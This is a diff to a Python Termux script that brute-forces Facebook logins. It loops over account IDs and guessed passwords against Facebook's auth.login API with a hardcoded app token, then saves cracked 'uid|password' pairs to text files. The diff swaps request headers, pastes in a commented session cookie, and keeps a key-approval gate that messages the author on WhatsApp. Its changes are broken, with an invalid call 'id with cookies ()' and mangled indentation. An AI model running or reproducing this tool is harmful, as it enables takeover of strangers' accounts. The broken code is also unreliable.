@@ -444,12 +444,12 @@ class Main:
 		print("\n\033[1;32m [1] File Cloning")
 		print(" [2]\033[1;33m Public Cloning")
 		print(" [3]\033[1;32m Create File")
-		print(" [4]\033[1;33m 2009-10 Cloning")
-		print(" [5]\033[1;32m 2011-14 Cloning")
+		print(" [4]\033[1;33m Random cloning")
+		print(" [5]\033[1;32m Bangladesi id cloning")
 		print(" [E]\033[1;33m Exit \n")
 		Ali =input(" Choose : ")
 		if Ali in ["1", "01"]:
-			File()
+			id with cookies ()
 		if Ali in ["2", "02"]:
 			Public()
 		if Ali in ["3", "03"]:
@@ -865,14 +865,26 @@ class Main:
 			pw = pw.lower()
 			ses = requests.Session()
 			headers = {
-				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
-				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
-				"x-fb-net-hni": str(random.randint(20000, 40000)), 
-				"x-fb-connection-quality": "EXCELLENT",
-				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-				"user-agent": rua, 
-				"content-type": "application/x-www-form-urlencoded", 
-				"x-fb-http-engine": "Liger"
+				'authority': 'p.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=X0oJZW472wwgdNvoo6zo2iPK; sb=X0oJZZ2iaHN5qG_7103RxixF; m_pixel_ratio=2.1615686416625977; wd=333x636; fr=0QOl3r8VHpdAZBz5G..BlCUpf.dT.AAA.0.0.BlCUrW.AWXhchoglVU',
+    'dpr': '1.600000023841858',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"RMX3171"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
@@ -1292,43 +1304,54 @@ class Main:
 			pw = pw.lower()
 			ses = requests.Session()
 			headers = {
-				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
-				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
-				"x-fb-net-hni": str(random.randint(20000, 40000)), 
-				"x-fb-connection-quality": "EXCELLENT",
-				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-				"user-agent": rua, 
-				"content-type": "application/x-www-form-urlencoded", 
-				"x-fb-http-engine": "Liger"
-			}
-			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
-			if "session_key" in response.text and "EAAA" in response.text:
+				'authority': 'p.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=X0oJZW472wwgdNvoo6zo2iPK; sb=X0oJZZ2iaHN5qG_7103RxixF; m_pixel_ratio=2.1615686416625977; wd=333x636; fr=0QOl3r8VHpdAZBz5G..BlCUpf.dT.AAA.0.0.BlCUrW.AWXhchoglVU',
+    'dpr': '1.600000023841858',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"RMX3171"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',}
+	   		response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
+	   		if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[0;92m[ ALIYAN-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-ALIYAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
-			elif "www.facebook.com" in response.json()["error_msg"]:
+	   		elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ ALIYAN-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("2009-ALIYAN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
-			else:
+	   		else:
 				continue
 
-		self.loop +=1
+	       	self.loop +=1
 
 
-def Subscraption():
-	key1=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
-	clear()
-	print(logo)
-	r1=requests.get("https://github.com/Romimmolla/Romimmolla/blob/main/Robin.txt").text
-	if key1 in r1:
+       def Subscraption():
+   	key1=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
+   	clear()
+   	print(logo)
+   	r1=requests.get("https://github.com/Romimmolla/Romimmolla/blob/main/Robin.txt").text
+   	if key1 in r1:
 		os.system('clear')
 		print(logo)
 		Main()
-	else:
+    	else:
 		os.system("clear")
 		print(logo)
 		print("\t \033[1;32m First Get Approvel\033[1;37m ")
@@ -1356,5 +1379,5 @@ def Subscraption():
 		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ah+key1
 		os.system('am start https://wa.me/+01785012931text=' + tks)
 		Subscraption()        
-Subscraption()
+        Subscraption()
 
